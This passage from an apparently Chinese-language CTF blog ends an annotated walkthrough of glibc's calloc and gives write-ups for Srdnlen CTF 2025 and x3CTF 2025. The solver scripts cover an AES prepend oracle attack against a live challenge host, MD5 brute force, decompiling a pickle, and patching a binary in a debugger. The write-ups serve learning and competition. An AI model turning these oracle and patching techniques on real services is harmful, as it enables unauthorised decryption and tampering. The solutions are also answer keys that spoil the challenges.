elem_size, \u0026amp;bytes))) { __set_errno(ENOMEM); return NULL; } sz = bytes; if (!__malloc_initialized) ptmalloc_init(); MAYBE_INIT_TCACHE(); //macro if (__glibc_unlikely (tcache == NULL)) \\ tcache_init(); if (SINGLE_THREAD_P) av = \u0026amp;main_arena; else arena_get(av, sz); if (av) { /* Check if we hand out the top chunk, in which case there may be no need to clear. */ #if MORECORE_CLEARS // 不做清零 oldtop = top(av); // 獲取topchunk oldtopsize = chunksize(top(av)); // 獲取topchunk size #if MORECORE_CLEARS \u0026lt; 2 /* Only newly allocated memory is guaranteed to be cleared. */ // 僅清除 top chunk 之外的部分記憶體 if (av == \u0026amp;main_arena \u0026amp;\u0026amp; oldtopsize \u0026lt; mp_.sbrk_base + av-\u0026gt;max_system_mem - (char *)oldtop) oldtopsize = (mp_.sbrk_base + av-\u0026gt;max_system_mem - (char *)oldtop); #endif if (av != \u0026amp;main_arena) // 不在main arena { heap_info *heap = heap_for_ptr(oldtop); if (oldtopsize \u0026lt; (char *)heap + heap-\u0026gt;mprotect_size - (char *)oldtop) oldtopsize = (char *)heap + heap-\u0026gt;mprotect_size - (char *)oldtop; // 確保沒有超過mprotect_size的區域 } #endif } else // 沒有可用的arena { /* No usable arenas. */ oldtop = 0; oldtopsize = 0; } mem = _int_malloc(av, sz); assert(!mem || chunk_is_mmapped(mem2chunk(mem)) || av == arena_for_chunk(mem2chunk(mem))); if (!SINGLE_THREAD_P) // 多 thread 的情況 { if (mem == 0 \u0026amp;\u0026amp; av != NULL) { LIBC_PROBE(memory_calloc_retry, 1, sz); av = arena_get_retry(av, sz); mem = _int_malloc(av, sz); } if (av != NULL) __libc_lock_unlock(av-\u0026gt;mutex); } /* Allocation failed even after a retry. */ // mem分配失敗 if (mem == 0) return 0; mchunkptr p = mem2chunk(mem); //轉換mem成chunk結構 /* If we are using memory tagging, then we need to set the tags regardless of MORECORE_CLEARS, so we zero the whole block while doing so. */ if (__glibc_unlikely(mtag_enabled)) return tag_new_zero_region(mem, memsize(p)); INTERNAL_SIZE_T csz = chunksize(p); // chunk size 清空mem #\rif (chunk_is_mmapped(p)) //透過mmap分配的 { if (__builtin_expect(perturb_byte, 0)) return memset(mem, 0, sz); return mem; } #if MORECORE_CLEARS if (perturb_byte == 0 \u0026amp;\u0026amp; (p == oldtop \u0026amp;\u0026amp; csz \u0026gt; oldtopsize)) { /* clear only the bytes from non-freshly-sbrked memory */ csz = oldtopsize; } #endif /* Unroll clear of \u0026lt;= 36 bytes (72 if 8byte sizes). We know that contents have an odd number of INTERNAL_SIZE_T-sized words; minimally 3. */ d = (INTERNAL_SIZE_T *)mem; // clearsize = csz - SIZE_SZ; // 要清空的大小 (SIZE_SZ代表作業系統處理器的大小) nclears = clearsize / sizeof(INTERNAL_SIZE_T); // 要清空的大小 assert(nclears \u0026gt;= 3); // 除了本身的大小之外，還有下一個chunk的prev_size if (nclears \u0026gt; 9) return memset(d, 0, clearsize); // 清空mem(迴圈方式) else // 清空mem { *(d + 0) = 0; *(d + 1) = 0; *(d + 2) = 0; if (nclears \u0026gt; 4) { *(d + 3) = 0; *(d + 4) = 0; if (nclears \u0026gt; 6) { *(d + 5) = 0; *(d + 6) = 0; if (nclears \u0026gt; 8) { *(d + 7) = 0; *(d + 8) = 0; } } } } return mem; } References #\rhttps://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/ https://www.kn0sky.com/?p=11a87cc5-03f1-4b05-b5ea-c6cda6cce999 https://blog.csdn.net/Tokameine/article/details/119482061 https://lowerbyte.github.io/Inside-malloc-part-1-malloc/ https://github.com/HATTER-LONG/glibc_Learnging/blob/main/Doc/02_内存管理/05_Ptmalloc内存申请分析_下.md https://blog.csdn.net/initphp/article/details/132815489 ","date":"2025-02-09","externalUrl":null,"permalink":"/notes/pwn/heap/5-malloc/","section":"Notes","summary":"__libc_malloc() #\r__libc_malloc為呼叫malloc實際執行的function victim 是作為回傳的記憶體 __libc_malloc(size_t bytes) { mstate ar_ptr; void *victim; _Static_assert(PTRDIFF_MAX \u0026lt;= SIZE_MAX / 2, \u0026#34;PTRDIFF_MAX is not more than half of SIZE_MAX\u0026#34;); if (!","title":"Malloc","type":"notes"},{"content":"\rIntro #\rranking #\r總排名101/1544|TOP 6%\nsolves #\rCategory Solves Misc 2/10 Pwn 0/5 Rev 3/3 Web 1/4 Crypto 1/4 就\u0026hellip;挺好玩的\n然後挺難的\nCrypto #\rConfusion #\rchal #\r#!/usr/bin/env python3 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import os # Local imports FLAG = os.getenv(\u0026#34;FLAG\u0026#34;, \u0026#34;srdnlen{REDACTED}\u0026#34;).encode() # Server encryption function def encrypt(msg, key): pad_msg = pad(msg, 16) blocks = [os.urandom(16)] + [pad_msg[i:i + 16] for i in range(0, len(pad_msg), 16)] b = [blocks[0]] for i in range(len(blocks) - 1): tmp = AES.new(key, AES.MODE_ECB).encrypt(blocks[i + 1]) b += [bytes(j ^ k for j, k in zip(tmp, blocks[i]))] c = [blocks[0]] for i in range(len(blocks) - 1): c += [AES.new(key, AES.MODE_ECB).decrypt(b[i + 1])] ct = [blocks[0]] for i in range(len(blocks) - 1): tmp = AES.new(key, AES.MODE_ECB).encrypt(c[i + 1]) ct += [bytes(j ^ k for j, k in zip(tmp, c[i]))] return b\u0026#34;\u0026#34;.join(ct) KEY = os.urandom(32) print(\u0026#34;Let\u0026#39;s try to make it confusing\u0026#34;) flag = encrypt(FLAG, KEY).hex() print(f\u0026#34;|\\n| flag = {flag}\u0026#34;) while True: print(\u0026#34;|\\n| ~ Want to encrypt something?\u0026#34;) msg = bytes.fromhex(input(\u0026#34;|\\n| \u0026gt; (hex) \u0026#34;)) plaintext = pad(msg + FLAG, 16) ciphertext = encrypt(plaintext, KEY) print(\u0026#34;|\\n| ~ Here is your encryption:\u0026#34;) print(f\u0026#34;|\\n| {ciphertext.hex()}\u0026#34;) solver #\r$$ b_{i+1} = Enc(P_{i+1}) \\oplus P_{i} \\\\ c_{i+1} = Dec(b_{i+1}) \\\\ ct_{i+1} = Eec(c_{i+1}) \\oplus c{i}\n$$\n使用prepend oracle，然後這題有pad過兩次，所以可以忽略最後一個block\n需要注意的是，$P_0$是隨機數，所以$ct_2$會被影響\npf:\n$$ c_{1} = Dec(b_{2}) \\\\ c_{1} = Dec(Enc(P_{1}) \\oplus P_{0})\n$$\n$$ ct_{2} = Eec(c_{2}) \\oplus Dec(Enc(P_{1}) \\oplus P_{0}) $$ 所以這題我選擇跳過$ct_0$~$ct_2$\nfrom pwn import * from tqdm import trange r = remote(\u0026#34;confusion.challs.srdnlen.it\u0026#34;, 1338) def rec(s): r.sendlineafter(b\u0026#34;\u0026gt; (hex) \u0026#34;, s.encode()) r.recvuntil(b\u0026#34;| ~ Here is your encryption:\\n|\\n| \u0026#34;) return r.recvline().strip() def get_top64byte(data): data = bytes.fromhex(data.decode()) data = data[48 : 48 + 4 * 16] return data flag = b\u0026#34;\u0026#34; for byte in range(53): base = 95 - byte cur_check = get_top64byte(rec(\u0026#34;aa\u0026#34; * base)) for ch in trange(0x20, 0x7f): payload = \u0026#34;aa\u0026#34; * (base) + flag.hex() + ch.to_bytes().hex() now = get_top64byte(rec(payload)) if now == cur_check: flag += ch.to_bytes() print(flag) break Rev #\rUnityOs #\rchal #\r這題是要逆一個用unity engine寫的系統(?\nAssembly-CSharp.dll有被混淆過\n要想辦法開啟這個奇怪的app\nsolve #\r把這裡改成false compile後可能會遇到這種error\n改成這樣就可以了\n另外就是這個奇怪的順序可能導致有些變數定義失效\n順著順序去除錯了就好了\nSanity Check #\rchal #\r這個binary會去查hash過後是否在詞，如果是的話就不會是flag\nslove #\r因為我第一次用一個字元查的時候發現有8個字母可以使用 ，但這些字母有7個開頭的繼續查會怪怪的\n因此這題要用dfs來解\nimport hashlib bank = open(\u0026#34;hardcore.bnk\u0026#34;, \u0026#34;rb\u0026#34;).read() bank = [bank[i:i + 16] for i in range(0, len(bank), 16)] print(len(bank)) def md5(s): m = hashlib.md5() m.update(s) return m.digest() def check(ch): if md5(ch.encode()) in bank: return True return False flag = \u0026#34;\u0026#34; def dfs(cur): result = [] print(cur) for i in range(0x20, 0x7f): if not check(cur + chr(i)): result.append(chr(i)) for ch in result: dfs(cur + ch) if len(result) == 0: print(cur) return dfs(flag) It\u0026rsquo;s not what it seems #\rchal #\r這題在start函數會把main()的保護關掉，然後去做xor運算，最後變成main()會跟原本的功能不一樣\n修改後的程式碼會檢查cl ^ al是否會等於0x40\n反過來說，我們只要得到所有cl的值就可以回推出al的值 而所有iteration的cl ^ 40組合在一起就會是flag\nsolve #\rfrom pwn import * a = b\u0026#34;32$.,%.;.s6s2\\037\\064\\062\\065u4\\037\\024(s\\037-tq.\\037\u0026amp;5.#4qp.=\u0026#34; b = 0x40 print(xor(a, b.to_bytes())) Web \u0026amp; Misc #\r打的題太水，就不寫了\n","date":"2025-01-27","externalUrl":null,"permalink":"/writeups/srdnlen-ctf-2025/","section":"Writeups","summary":"Intro #\rranking #\r總排名101/1544|TOP 6%","title":"Srdnlen CTF 2025","type":"writeups"},{"content":"","date":"2025-01-27","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"\rIntro #\rranking #\r總排名27/528|TOP 5%\n這次在寒訓回來之後跑來支援，然後小打個幾題之後就跑走了:P\n下次會早點打)\nsolves(personal) #\rCategory Solves Rev 2/6 Reverse #\rpickle-season #\rchal #\rimport pickle data = \u0026#34;8004637379730a6d6f64756c65730a8c017494636275696c74696e730a747970650a8c00297d87529473304e9430636275696c74696e730a7072696e740a9470320a68014e7d8c0162946802738662303063740a622e5f5f73656c665f5f0a70320a68014e7d680468027386623030284b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004ad6ffffff6c70320a68014e7d8c0169946802738662303063740a692e657874656e640a63740a622e6d61700a63740a622e6f72640a63740a622e696e7075740a8c06466c61673f20855286528552307d4da2027d4dcc027d4dfc027d4d8f027d4dbb027d4d88027d4dfb027d4da4027d4d97027d4dfb027d4d90027d4df3027d4dc2027d4d92027d4dcd027d4da3027d4d92027d4dcd027d4da0027d4d90027d4df4027d4dc7027d4db5027d4d85027d4dc7027d4dbc027d4df1027d4da7027d4dea027d4e8c08436f72726563742173737373737373737373737373737373737373737373737373737373737370320a68014e7d8c0164946802738662303068008c05642e676574948c05692e706f70948c09782e5f5f786f725f5f94303030304ddf0270320a68014e7d8c017894680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d680668027386623030680368006807934e8c0b57726f6e672e2e2e203a28865285522e\u0026#34; pickle.loads(bytes.fromhex(data)) solver #\rpickle 模組實作的是一個在二進位層級上對 Python 物件進行序列化（serialize）或去序列化（de-serialize）。\u0026ldquo;Pickling\u0026rdquo; 用於專門指摘將一個 Python 物件轉換為一個二進位串流的過程，\u0026ldquo;unpickling\u0026rdquo; 則相反，指的是將一個（來自 binary file 或 bytes-like object 的）二進位串流轉換回 Python 物件的過程。Pickling（和 unpickling）的過程也可能被稱作 \u0026ldquo;serialization\u0026rdquo;, \u0026ldquo;marshalling,\u0026rdquo; 或 \u0026ldquo;flattening\u0026rdquo;。不過，為了避免混淆，本文件將統一稱作封裝（pickling）、拆封（unpickling）。\n根據python官方doc可以得知pickle可以把python物件序列化\n所以這個程式能動跟python拖不了關係，我會嘗試把他decompile為更高階的code\n使用了好用的工具，可以將物件load而不執行\n因此可以轉換成python ast(抽象語法樹)，再進行decompile\nimport astunparse from fickling.fickle import Pickled data = \u0026#34;8004637379730a6d6f64756c65730a8c017494636275696c74696e730a747970650a8c00297d87529473304e9430636275696c74696e730a7072696e740a9470320a68014e7d8c0162946802738662303063740a622e5f5f73656c665f5f0a70320a68014e7d680468027386623030284b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004b004ad6ffffff6c70320a68014e7d8c0169946802738662303063740a692e657874656e640a63740a622e6d61700a63740a622e6f72640a63740a622e696e7075740a8c06466c61673f20855286528552307d4da2027d4dcc027d4dfc027d4d8f027d4dbb027d4d88027d4dfb027d4da4027d4d97027d4dfb027d4d90027d4df3027d4dc2027d4d92027d4dcd027d4da3027d4d92027d4dcd027d4da0027d4d90027d4df4027d4dc7027d4db5027d4d85027d4dc7027d4dbc027d4df1027d4da7027d4dea027d4e8c08436f72726563742173737373737373737373737373737373737373737373737373737373737370320a68014e7d8c0164946802738662303068008c05642e676574948c05692e706f70948c09782e5f5f786f725f5f94303030304ddf0270320a68014e7d8c017894680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d6806680273866230306800680793680068099368006808932952855270320a68014e7d680a6802738662307d865270320a68014e7d680668027386623030680368006807934e8c0b57726f6e672e2e2e203a28865285522e\u0026#34; pkl = Pickled.load(bytes.fromhex(data)) print(astunparse.unparse(pkl.ast)) 執行結果\nfrom sys import modules _var0 = type(\u0026#39;\u0026#39;, (), {}) _var1 = modules _var1[\u0026#39;t\u0026#39;] = _var0 _var2 = _var0 _var2.__setstate__((None, {\u0026#39;b\u0026#39;: print})) from t import b.__self__ _var3 = _var0 _var3.__setstate__((None, {\u0026#39;b\u0026#39;: b.__self__})) _var4 = _var0 _var4.__setstate__((None, {\u0026#39;i\u0026#39;: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -42]})) from t import i.extend from t import b.map from t import b.ord from t import b.input _var5 = b.input(\u0026#39;Flag? \u0026#39;) _var6 = b.map(b.ord, _var5) _var7 = i.extend(_var6) _var8 = _var0 _var8.__setstate__((None, {\u0026#39;d\u0026#39;: {674: {716: {764: {655: {699: {648: {763: {676: {663: {763: {656: {755: {706: {658: {717: {675: {658: {717: {672: {656: {756: {711: {693: {645: {711: {700: {753: {679: {746: {None: \u0026#39;Correct!\u0026#39;}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}})) _var9 = _var0 _var9.__setstate__((None, {\u0026#39;x\u0026#39;: 735})) from t import d.get from t import x.__xor__ from t import i.pop _var10 = i.pop() _var11 = x.__xor__(_var10) _var12 = _var0 _var12.__setstate__((None, {\u0026#39;x\u0026#39;: _var11})) _var13 = d.get(_var11, {}) _var14 = _var0 _var14.__setstate__((None, {\u0026#39;d\u0026#39;: _var13})) from t import d.get from t import x.__xor__ from t import i.pop _var15 = i.pop() _var16 = x.__xor__(_var15) _var17 = _var0 _var17.__setstate__((None, {\u0026#39;x\u0026#39;: _var16})) _var18 = d.get(_var16, {}) _var19 = _var0 _var19.__setstate__((None, {\u0026#39;d\u0026#39;: _var18})) from t import d.get from t import x.__xor__ from t import i.pop _var20 = i.pop() _var21 = x.__xor__(_var20) _var22 = _var0 _var22.__setstate__((None, {\u0026#39;x\u0026#39;: _var21})) _var23 = d.get(_var21, {}) _var24 = _var0 _var24.__setstate__((None, {\u0026#39;d\u0026#39;: _var23})) from t import d.get from t import x.__xor__ from t import i.pop _var25 = i.pop() _var26 = x.__xor__(_var25) _var27 = _var0 _var27.__setstate__((None, {\u0026#39;x\u0026#39;: _var26})) _var28 = d.get(_var26, {}) _var29 = _var0 _var29.__setstate__((None, {\u0026#39;d\u0026#39;: _var28})) from t import d.get from t import x.__xor__ from t import i.pop _var30 = i.pop() _var31 = x.__xor__(_var30) _var32 = _var0 _var32.__setstate__((None, {\u0026#39;x\u0026#39;: _var31})) _var33 = d.get(_var31, {}) _var34 = _var0 _var34.__setstate__((None, {\u0026#39;d\u0026#39;: _var33})) from t import d.get from t import x.__xor__ from t import i.pop _var35 = i.pop() _var36 = x.__xor__(_var35) _var37 = _var0 _var37.__setstate__((None, {\u0026#39;x\u0026#39;: _var36})) _var38 = d.get(_var36, {}) _var39 = _var0 _var39.__setstate__((None, {\u0026#39;d\u0026#39;: _var38})) from t import d.get from t import x.__xor__ from t import i.pop _var40 = i.pop() _var41 = x.__xor__(_var40) _var42 = _var0 _var42.__setstate__((None, {\u0026#39;x\u0026#39;: _var41})) _var43 = d.get(_var41, {}) _var44 = _var0 _var44.__setstate__((None, {\u0026#39;d\u0026#39;: _var43})) from t import d.get from t import x.__xor__ from t import i.pop _var45 = i.pop() _var46 = x.__xor__(_var45) _var47 = _var0 _var47.__setstate__((None, {\u0026#39;x\u0026#39;: _var46})) _var48 = d.get(_var46, {}) _var49 = _var0 _var49.__setstate__((None, {\u0026#39;d\u0026#39;: _var48})) from t import d.get from t import x.__xor__ from t import i.pop _var50 = i.pop() _var51 = x.__xor__(_var50) _var52 = _var0 _var52.__setstate__((None, {\u0026#39;x\u0026#39;: _var51})) _var53 = d.get(_var51, {}) _var54 = _var0 _var54.__setstate__((None, {\u0026#39;d\u0026#39;: _var53})) from t import d.get from t import x.__xor__ from t import i.pop _var55 = i.pop() _var56 = x.__xor__(_var55) _var57 = _var0 _var57.__setstate__((None, {\u0026#39;x\u0026#39;: _var56})) _var58 = d.get(_var56, {}) _var59 = _var0 _var59.__setstate__((None, {\u0026#39;d\u0026#39;: _var58})) from t import d.get from t import x.__xor__ from t import i.pop _var60 = i.pop() _var61 = x.__xor__(_var60) _var62 = _var0 _var62.__setstate__((None, {\u0026#39;x\u0026#39;: _var61})) _var63 = d.get(_var61, {}) _var64 = _var0 _var64.__setstate__((None, {\u0026#39;d\u0026#39;: _var63})) from t import d.get from t import x.__xor__ from t import i.pop _var65 = i.pop() _var66 = x.__xor__(_var65) _var67 = _var0 _var67.__setstate__((None, {\u0026#39;x\u0026#39;: _var66})) _var68 = d.get(_var66, {}) _var69 = _var0 _var69.__setstate__((None, {\u0026#39;d\u0026#39;: _var68})) from t import d.get from t import x.__xor__ from t import i.pop _var70 = i.pop() _var71 = x.__xor__(_var70) _var72 = _var0 _var72.__setstate__((None, {\u0026#39;x\u0026#39;: _var71})) _var73 = d.get(_var71, {}) _var74 = _var0 _var74.__setstate__((None, {\u0026#39;d\u0026#39;: _var73})) from t import d.get from t import x.__xor__ from t import i.pop _var75 = i.pop() _var76 = x.__xor__(_var75) _var77 = _var0 _var77.__setstate__((None, {\u0026#39;x\u0026#39;: _var76})) _var78 = d.get(_var76, {}) _var79 = _var0 _var79.__setstate__((None, {\u0026#39;d\u0026#39;: _var78})) from t import d.get from t import x.__xor__ from t import i.pop _var80 = i.pop() _var81 = x.__xor__(_var80) _var82 = _var0 _var82.__setstate__((None, {\u0026#39;x\u0026#39;: _var81})) _var83 = d.get(_var81, {}) _var84 = _var0 _var84.__setstate__((None, {\u0026#39;d\u0026#39;: _var83})) from t import d.get from t import x.__xor__ from t import i.pop _var85 = i.pop() _var86 = x.__xor__(_var85) _var87 = _var0 _var87.__setstate__((None, {\u0026#39;x\u0026#39;: _var86})) _var88 = d.get(_var86, {}) _var89 = _var0 _var89.__setstate__((None, {\u0026#39;d\u0026#39;: _var88})) from t import d.get from t import x.__xor__ from t import i.pop _var90 = i.pop() _var91 = x.__xor__(_var90) _var92 = _var0 _var92.__setstate__((None, {\u0026#39;x\u0026#39;: _var91})) _var93 = d.get(_var91, {}) _var94 = _var0 _var94.__setstate__((None, {\u0026#39;d\u0026#39;: _var93})) from t import d.get from t import x.__xor__ from t import i.pop _var95 = i.pop() _var96 = x.__xor__(_var95) _var97 = _var0 _var97.__setstate__((None, {\u0026#39;x\u0026#39;: _var96})) _var98 = d.get(_var96, {}) _var99 = _var0 _var99.__setstate__((None, {\u0026#39;d\u0026#39;: _var98})) from t import d.get from t import x.__xor__ from t import i.pop _var100 = i.pop() _var101 = x.__xor__(_var100) _var102 = _var0 _var102.__setstate__((None, {\u0026#39;x\u0026#39;: _var101})) _var103 = d.get(_var101, {}) _var104 = _var0 _var104.__setstate__((None, {\u0026#39;d\u0026#39;: _var103})) from t import d.get from t import x.__xor__ from t import i.pop _var105 = i.pop() _var106 = x.__xor__(_var105) _var107 = _var0 _var107.__setstate__((None, {\u0026#39;x\u0026#39;: _var106})) _var108 = d.get(_var106, {}) _var109 = _var0 _var109.__setstate__((None, {\u0026#39;d\u0026#39;: _var108})) from t import d.get from t import x.__xor__ from t import i.pop _var110 = i.pop() _var111 = x.__xor__(_var110) _var112 = _var0 _var112.__setstate__((None, {\u0026#39;x\u0026#39;: _var111})) _var113 = d.get(_var111, {}) _var114 = _var0 _var114.__setstate__((None, {\u0026#39;d\u0026#39;: _var113})) from t import d.get from t import x.__xor__ from t import i.pop _var115 = i.pop() _var116 = x.__xor__(_var115) _var117 = _var0 _var117.__setstate__((None, {\u0026#39;x\u0026#39;: _var116})) _var118 = d.get(_var116, {}) _var119 = _var0 _var119.__setstate__((None, {\u0026#39;d\u0026#39;: _var118})) from t import d.get from t import x.__xor__ from t import i.pop _var120 = i.pop() _var121 = x.__xor__(_var120) _var122 = _var0 _var122.__setstate__((None, {\u0026#39;x\u0026#39;: _var121})) _var123 = d.get(_var121, {}) _var124 = _var0 _var124.__setstate__((None, {\u0026#39;d\u0026#39;: _var123})) from t import d.get from t import x.__xor__ from t import i.pop _var125 = i.pop() _var126 = x.__xor__(_var125) _var127 = _var0 _var127.__setstate__((None, {\u0026#39;x\u0026#39;: _var126})) _var128 = d.get(_var126, {}) _var129 = _var0 _var129.__setstate__((None, {\u0026#39;d\u0026#39;: _var128})) from t import d.get from t import x.__xor__ from t import i.pop _var130 = i.pop() _var131 = x.__xor__(_var130) _var132 = _var0 _var132.__setstate__((None, {\u0026#39;x\u0026#39;: _var131})) _var133 = d.get(_var131, {}) _var134 = _var0 _var134.__setstate__((None, {\u0026#39;d\u0026#39;: _var133})) from t import d.get from t import x.__xor__ from t import i.pop _var135 = i.pop() _var136 = x.__xor__(_var135) _var137 = _var0 _var137.__setstate__((None, {\u0026#39;x\u0026#39;: _var136})) _var138 = d.get(_var136, {}) _var139 = _var0 _var139.__setstate__((None, {\u0026#39;d\u0026#39;: _var138})) from t import d.get from t import x.__xor__ from t import i.pop _var140 = i.pop() _var141 = x.__xor__(_var140) _var142 = _var0 _var142.__setstate__((None, {\u0026#39;x\u0026#39;: _var141})) _var143 = d.get(_var141, {}) _var144 = _var0 _var144.__setstate__((None, {\u0026#39;d\u0026#39;: _var143})) from t import d.get from t import x.__xor__ from t import i.pop _var145 = i.pop() _var146 = x.__xor__(_var145) _var147 = _var0 _var147.__setstate__((None, {\u0026#39;x\u0026#39;: _var146})) _var148 = d.get(_var146, {}) _var149 = _var0 _var149.__setstate__((None, {\u0026#39;d\u0026#39;: _var148})) from t import d.get from t import x.__xor__ from t import i.pop _var150 = i.pop() _var151 = x.__xor__(_var150) _var152 = _var0 _var152.__setstate__((None, {\u0026#39;x\u0026#39;: _var151})) _var153 = d.get(_var151, {}) _var154 = _var0 _var154.__setstate__((None, {\u0026#39;d\u0026#39;: _var153})) from t import d.get _var155 = d.get(None, \u0026#39;Wrong... :(\u0026#39;) _var156 = print(_var155) result = _var156 雖然我看不了解他的語法，但可以去猜測 x每次會被xor一個值 且在每次更新完之後會更新\u0026rsquo;x\u0026rsquo;的值為被xor過後的值\ncheck = [735,674,716,764,655,699,648,763,676,663,763,656,755,706,658,717,675,658,717,672,656,756,711,693,645,711,700,753,679,746] flag = \u0026#34;\u0026#34; for i in range(len(check) - 1): flag += chr(check[i] ^ check[i + 1]) print(flag[::-1]) net-msg #\rchal #\r題目給你一個binary，要連線和遠端互動 solve #\r可以看到binary是沒有實作f的功能，同樣包括其他所有功能，推測是後端在執行\n接著看m實作 有Send和Recv，且功能正常\nsend並未傳出任何信息，這有點詭異，然後有很多功能有調用到SendWrapped，因此我推測另外有一個值在控制他要選擇的功能 進去SendWrapped下斷點，發現bl的值在每個不同的功能都不一樣 下斷點在function call之前，改剛剛bl的值 然後經過我的嘗試，改成8的報錯會不一樣\n代表他有接收到值，但不是mailbox的結果\n在call RecvWrapped後下斷點，因為後面有一個處理結果的實作\n順利解決\n另外有一題net-msg2用同樣一個binary，只是考點不同(有混Crypto)，然後我那時候第一題打完腦子有點亂就先跑了QwQ\nsorry拉各位\n","date":"2025-01-27","externalUrl":null,"permalink":"/writeups/x3ctf-2025/","section":"Writeups","summary":"Intro #\rranking #\r總排名27/528|TOP 5%","title":"x3CTF 2025","type":"writeups"},{"content":"\r總排名40/1529|TOP 2%\nsolves (personal) #\r有些跟隊員有重複，但還是紀錄一下\nCategory solves Reverse 1/6 Networks 1/4 Cryptography 1/4 Binary Exploitation 1/3 Reverse #\rCrispy Kelp #\r這題是golang逆向，老實說我完全不懂golang，但不至於那麼難\nmain 